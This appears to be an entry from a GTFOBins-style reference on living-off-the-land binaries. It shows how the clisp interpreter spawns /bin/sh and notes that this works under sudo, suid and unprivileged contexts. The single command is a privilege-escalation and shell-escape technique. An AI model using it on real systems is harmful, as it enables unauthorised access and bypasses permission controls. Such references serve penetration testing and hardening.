---
type: gtfobin
name: clisp
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# clisp

## shell

```bash
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```
**Contexts:** sudo, suid, unprivileged
